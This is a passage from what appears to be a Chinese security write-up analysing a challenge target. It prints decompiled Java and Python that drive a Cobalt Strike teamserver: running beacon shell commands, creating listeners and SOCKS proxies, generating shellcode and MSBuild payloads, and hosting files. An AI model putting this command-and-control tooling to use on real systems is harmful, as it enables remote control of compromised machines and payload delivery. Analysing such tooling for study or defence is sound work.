         <span class="n">pb</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
      <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
         <span class="n">ProcessBuilder</span> <span class="n">pb</span><span class="o">;</span>
         <span class="k">if</span> <span class="o">(</span><span class="n">ScriptType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"&amp;get_listener_info"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">SocksPort</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.ListenerName"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
            <span class="n">pb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"python3"</span><span class="o">,</span> <span class="s">"/tmp/index.py"</span><span class="o">,</span> <span class="s">"get_listener_info"</span><span class="o">,</span> <span class="n">CSIp</span><span class="o">,</span> <span class="n">CSPort</span><span class="o">,</span> <span class="n">CSUserName</span><span class="o">,</span> <span class="n">CSPassWord</span><span class="o">,</span> <span class="n">AgScriptPath</span><span class="o">,</span> <span class="n">SocksPort</span><span class="o">});</span>
            <span class="n">pb</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
         <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">ScriptType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"&amp;create_socks"</span><span class="o">))</span> <span class="o">{</span>
            <span class="n">SocksPort</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.SocksPort"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
            <span class="n">beaconid</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.beaconid"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
            <span class="n">pb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"python3"</span><span class="o">,</span> <span class="s">"/tmp/index.py"</span><span class="o">,</span> <span class="s">"create_socks"</span><span class="o">,</span> <span class="n">CSIp</span><span class="o">,</span> <span class="n">CSPort</span><span class="o">,</span> <span class="n">CSUserName</span><span class="o">,</span> <span class="n">CSPassWord</span><span class="o">,</span> <span class="n">AgScriptPath</span><span class="o">,</span> <span class="n">beaconid</span><span class="o">,</span> <span class="n">SocksPort</span><span class="o">});</span>
            <span class="n">pb</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
         <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">SocksPort</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.ScriptContent"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
            <span class="n">pb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"python3"</span><span class="o">,</span> <span class="s">"/tmp/index.py"</span><span class="o">,</span> <span class="s">"run_script"</span><span class="o">,</span> <span class="n">CSIp</span><span class="o">,</span> <span class="n">CSPort</span><span class="o">,</span> <span class="n">CSUserName</span><span class="o">,</span> <span class="n">CSPassWord</span><span class="o">,</span> <span class="n">AgScriptPath</span><span class="o">,</span> <span class="n">SocksPort</span><span class="o">});</span>
            <span class="n">pb</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
         <span class="o">}</span>
      <span class="o">}</span>

      <span class="n">StringBuilder</span> <span class="n">content</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>

      <span class="k">try</span> <span class="o">{</span>
         <span class="n">Scanner</span> <span class="n">scanner</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"/tmp/result.txt"</span><span class="o">));</span>
         <span class="n">Throwable</span> <span class="n">var78</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

         <span class="k">try</span> <span class="o">{</span>
            <span class="k">while</span><span class="o">(</span><span class="n">scanner</span><span class="o">.</span><span class="na">hasNextLine</span><span class="o">())</span> <span class="o">{</span>
               <span class="n">content</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">()).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
            <span class="o">}</span>
         <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var64</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">var78</span> <span class="o">=</span> <span class="n">var64</span><span class="o">;</span>
            <span class="k">throw</span> <span class="n">var64</span><span class="o">;</span>
         <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">scanner</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
               <span class="k">if</span> <span class="o">(</span><span class="n">var78</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                  <span class="k">try</span> <span class="o">{</span>
                     <span class="n">scanner</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var60</span><span class="o">)</span> <span class="o">{</span>
                     <span class="n">var78</span><span class="o">.</span><span class="na">addSuppressed</span><span class="o">(</span><span class="n">var60</span><span class="o">);</span>
                  <span class="o">}</span>
               <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                  <span class="n">scanner</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
               <span class="o">}</span>
            <span class="o">}</span>

         <span class="o">}</span>
      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var66</span><span class="o">)</span> <span class="o">{</span>
         <span class="n">var66</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>

      <span class="n">beaconid</span> <span class="o">=</span> <span class="n">String</span><span class="o">.</span><span class="na">join</span><span class="o">(</span><span class="s">"\n"</span><span class="o">,</span> <span class="n">content</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
      <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"pythonOutput"</span><span class="o">,</span> <span class="n">beaconid</span><span class="o">);</span>
      <span class="k">return</span> <span class="s">"connect/output"</span><span class="o">;</span>
   <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>通过读文件得到对应参数后会运行index.py文件，我们跟进去看一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241203235807-63815386-b18f-1.png"/></p>
<p>index.py</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">script.striker</span> <span class="kn">import</span> <span class="n">CSConnector</span>


<span class="n">command_type</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>

<span class="k">with</span> <span class="n">CSConnector</span><span class="p">(</span>
        <span class="n">cs_host</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span>
        <span class="n">cs_port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
        <span class="n">cs_user</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">],</span>
        <span class="n">cs_pass</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span>
        <span class="n">cs_directory</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">6</span><span class="p">])</span> <span class="k">as</span> <span class="n">cs</span><span class="p">:</span>
    <span class="n">output</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="k">if</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"beacon_shell"</span><span class="p">):</span>
        <span class="n">beaconid</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">CSCmd</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">beacon_shell</span><span class="p">(</span><span class="n">beaconid</span><span class="p">,</span><span class="n">CSCmd</span><span class="p">)</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"create_http_listener"</span><span class="p">):</span>
        <span class="n">ListenerName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">ListenerType</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="c1">#后面固定了，懒得改了</span>
        <span class="n">ListenerIp</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span>
        <span class="n">ListenerPort</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">create_http_listener</span><span class="p">(</span><span class="n">ListenerName</span><span class="p">,</span><span class="n">ListenerIp</span><span class="p">,</span><span class="n">ListenerPort</span><span class="p">,</span><span class="n">ListenerIp</span><span class="p">)</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"get_beacons"</span><span class="p">):</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">get_beacons</span><span class="p">()</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"get_listener_info"</span><span class="p">):</span>
        <span class="n">ListenerName</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">get_listener_info</span><span class="p">(</span><span class="n">ListenerName</span><span class="p">)</span>
    <span class="k">elif</span><span class="p">(</span><span class="n">command_type</span> <span class="o">==</span> <span class="s2">"create_socks"</span><span class="p">):</span>
        <span class="n">beaconid</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">SocksPort</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">create_socks</span><span class="p">(</span><span class="n">beaconid</span><span class="p">,</span> <span class="n">SocksPort</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ScriptContent</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span>
        <span class="n">output</span> <span class="o">=</span> <span class="n">cs</span><span class="o">.</span><span class="n">run_script</span><span class="p">(</span><span class="n">ScriptContent</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"/tmp/result.txt"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">output</span><span class="p">))</span>
    <span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p>获取命令传入的参数，创建cs实例，按照源码格式填写表单，即可发送对应数据。任何一个服务器的teamserver服务都是可以被靶机连接的，执行对应type的命令可以拿到teamserver相应的结果</p>
<p>接着我们查看CSConnector该类的源码</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pexpect</span>
<span class="kn">import</span> <span class="nn">getpass</span>
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">path</span>
<span class="kn">from</span> <span class="nn">os.path</span> <span class="kn">import</span> <span class="n">abspath</span>
<span class="kn">from</span> <span class="nn">re</span> <span class="kn">import</span> <span class="n">findall</span><span class="p">,</span> <span class="n">escape</span><span class="p">,</span> <span class="n">MULTILINE</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">defaultdict</span>


<span class="kn">from</span> <span class="nn">script.sleepy</span> <span class="kn">import</span> <span class="n">wrap_command</span><span class="p">,</span> <span class="n">deserialize</span><span class="p">,</span> <span class="n">convert_to_oneline</span>
<span class="kn">from</span> <span class="nn">enum</span> <span class="kn">import</span> <span class="n">Enum</span>

<span class="k">class</span> <span class="nc">ArtifactType</span><span class="p">(</span><span class="n">Enum</span><span class="p">):</span>
    <span class="n">DLL</span> <span class="o">=</span> <span class="s2">"dll"</span>
    <span class="n">EXE</span> <span class="o">=</span> <span class="s2">"exe"</span>
    <span class="n">POWERSHELL</span> <span class="o">=</span> <span class="s2">"powershell"</span>
    <span class="n">PYTHON</span> <span class="o">=</span> <span class="s2">"python"</span>
    <span class="n">RAW</span> <span class="o">=</span> <span class="s2">"raw"</span>
    <span class="n">SVCEXE</span> <span class="o">=</span> <span class="s2">"svcexe"</span>
    <span class="n">VBSCRIPT</span> <span class="o">=</span> <span class="s2">"vbscript"</span>


<span class="k">class</span> <span class="nc">CSConnector</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cs_host</span><span class="p">,</span> <span class="n">cs_user</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">cs_pass</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">cs_directory</span><span class="o">=</span><span class="s2">"./"</span><span class="p">,</span> <span class="n">cs_port</span><span class="o">=</span><span class="mi">50050</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">cs_host</span> <span class="o">=</span> <span class="n">cs_host</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">cs_user</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">cs_pass</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">cs_port</span><span class="p">:</span>
            <span class="n">agproperties</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_aggressor_properties</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">cs_host</span> <span class="ow">in</span> <span class="n">agproperties</span><span class="p">:</span>
                <span class="n">cs_user</span> <span class="o">=</span> <span class="n">agproperties</span><span class="p">[</span><span class="n">cs_host</span><span class="p">][</span><span class="s2">"user"</span><span class="p">]</span>
                <span class="n">cs_port</span> <span class="o">=</span> <span class="n">agproperties</span><span class="p">[</span><span class="n">cs_host</span><span class="p">][</span><span class="s2">"port"</span><span class="p">]</span>
                <span class="n">cs_pass</span> <span class="o">=</span> <span class="n">agproperties</span><span class="p">[</span><span class="n">cs_host</span><span class="p">][</span><span class="s2">"password"</span><span class="p">]</span>


        <span class="bp">self</span><span class="o">.</span><span class="n">cs_user</span> <span class="o">=</span> <span class="n">cs_user</span> <span class="o">+</span> <span class="s2">"_striker"</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">cs_pass</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">cs_pass</span> <span class="o">=</span> <span class="n">getpass</span><span class="o">.</span><span class="n">getpass</span><span class="p">(</span><span class="s2">"Enter Cobalt Strike password: "</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">cs_pass</span> <span class="o">=</span> <span class="n">cs_pass</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">cs_port</span> <span class="o">=</span> <span class="n">cs_port</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">cs_directory</span> <span class="o">=</span> <span class="n">cs_directory</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">aggscriptcmd</span> <span class="o">=</span> <span class="s2">"'{}/agscript'"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">cs_directory</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">cs_process</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="fm">__enter__</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="s1">'CSConnector'</span><span class="p">:</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">connectTeamserver</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">self</span>

    <span class="k">def</span> <span class="fm">__exit__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="nb">type</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">tb</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">disconnectTeamserver</span><span class="p">()</span>
    <span class="k">def</span> <span class="nf">generateMSBuild</span><span class="p">(</span>
        <span class="bp">self</span><span class="p">,</span>
        <span class="n">agscriptPath</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
        <span class="n">listener</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
        <span class="n">outputPath</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'./'</span><span class="p">,</span>
        <span class="n">staged</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span>
        <span class="n">x64</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generateShellcode</span><span class="p">(</span><span class="n">listener</span><span class="p">,</span> <span class="n">staged</span><span class="o">=</span><span class="n">staged</span><span class="p">,</span> <span class="n">x64</span><span class="o">=</span><span class="n">x64</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">shellcode</span><span class="p">:</span>
            <span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">x64</span><span class="p">:</span>
                <span class="n">arch</span> <span class="o">=</span> <span class="s2">"64"</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">arch</span> <span class="o">=</span> <span class="s2">"32"</span>

            <span class="k">if</span> <span class="n">staged</span><span class="p">:</span>
                <span class="n">filename</span> <span class="o">=</span> <span class="s1">'staged'</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">filename</span> <span class="o">=</span> <span class="s1">'stageless'</span>

            <span class="n">templateFile</span> <span class="o">=</span> <span class="n">f</span><span class="s1">'Helpers/msBuild/artifact_{arch}.xml'</span>
            <span class="n">templatePath</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">agscriptPath</span><span class="p">,</span> <span class="n">templateFile</span><span class="p">)</span>
            <span class="n">filename</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">outputPath</span><span class="p">,</span> <span class="n">f</span><span class="s1">'{filename}_{arch}.xml'</span><span class="p">)</span>

            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">templatePath</span><span class="p">,</span> <span class="s1">'rt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">read_file</span><span class="p">:</span>
                <span class="n">data</span> <span class="o">=</span> <span class="n">read_file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

            <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'</span><span class="si">%%</span><span class="s1">DATA</span><span class="si">%%</span><span class="s1">'</span><span class="p">,</span> <span class="n">encoded</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'wt'</span><span class="p">)</span> <span class="k">as</span> <span class="n">write_file</span><span class="p">:</span>
                <span class="n">write_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">generateShellcode</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">listener</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>  <span class="n">staged</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="n">x64</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">True</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">generatePayload</span><span class="p">(</span><span class="n">listener</span><span class="p">,</span> <span class="n">ArtifactType</span><span class="o">.</span><span class="n">RAW</span><span class="p">,</span> <span class="n">staged</span><span class="o">=</span><span class="n">staged</span><span class="p">,</span> <span class="n">x64</span><span class="o">=</span><span class="n">x64</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">generatePayload</span><span class="p">(</span>
        <span class="bp">self</span><span class="p">,</span>
        <span class="n">listener</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
        <span class="n">artifact_type</span><span class="p">:</span> <span class="s1">'ArtifactType'</span><span class="p">,</span>
        <span class="n">staged</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span>
        <span class="n">x64</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">True</span><span class="p">,</span>
        <span class="nb">exit</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">''</span><span class="p">,</span>
        <span class="n">callmethod</span> <span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">x64</span><span class="p">:</span>
            <span class="n">arch</span> <span class="o">=</span> <span class="s2">"x64"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">arch</span> <span class="o">=</span> <span class="s2">"x86"</span>

        <span class="k">if</span> <span class="n">staged</span><span class="p">:</span>
            <span class="n">function</span> <span class="o">=</span> <span class="s2">"artifact_stager"</span>
            <span class="n">cmd</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"return base64_encode(artifact_stager('{listener}', '{artifact_type.value}', '{arch}'))"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">callmethod</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="nb">exit</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">cmd</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}', '{exit}', '{callmethod}'))"</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">cmd</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}'))"</span>

        <span class="n">encoded_bytes</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ag_get_object</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30000</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded_bytes</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">hostFile</span><span class="p">(</span>
        <span class="bp">self</span><span class="p">,</span>
        <span class="n">file_path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
        <span class="n">site</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span>
        <span class="n">port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">80</span><span class="p">,</span>
        <span class="n">uri</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'/hosted.txt'</span><span class="p">,</span>
        <span class="n">mime_type</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'text/plain'</span><span class="p">,</span>
        <span class="n">description</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">'Autohosted File'</span><span class="p">,</span>
        <span class="n">use_ssl</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span>
        <span class="n">sleep_time</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">2</span>
    <span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">site</span><span class="p">:</span>
            <span class="n">site</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_local_ip</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">site</span><span class="p">:</span>
                <span class="n">site</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"</span><span class="se">\"</span><span class="s2">{site}</span><span class="se">\"</span><span class="s2">"</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">site</span> <span class="o">=</span> <span class="s2">"localip()"</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">site</span><span class="o">=</span><span class="s2">"</span><span class="se">\"</span><span class="s2">{}</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">site</span><span class="p">)</span>

        <span class="n">sites</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_sites</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">a_site</span> <span class="ow">in</span> <span class="n">sites</span><span class="p">:</span>
            <span class="n">site_type</span> <span class="o">=</span> <span class="n">a_site</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'Type'</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">site_type</span> <span class="o">==</span> <span class="s1">'page'</span><span class="p">:</span>
                <span class="n">site_host</span> <span class="o">=</span> <span class="n">a_site</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'Host'</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">f</span><span class="s2">"</span><span class="se">\"</span><span class="s2">{site_host}</span><span class="se">\"</span><span class="s2">"</span> <span class="o">==</span> <span class="n">site</span><span class="p">:</span>
                    <span class="n">site_uri</span> <span class="o">=</span> <span class="n">a_site</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'URI'</span><span class="p">)</span>
                    <span class="k">if</span> <span class="n">site_uri</span> <span class="o">==</span> <span class="n">uri</span><span class="p">:</span>
                        <span class="bp">self</span><span class="o">.</span><span class="n">killHostedFile</span><span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="o">=</span><span class="n">uri</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">use_ssl</span><span class="p">:</span>
            <span class="n">link</span> <span class="o">=</span> <span class="s2">"https://{}:{}{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">site</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">'</span><span class="se">\"</span><span class="s1">'</span><span class="p">),</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
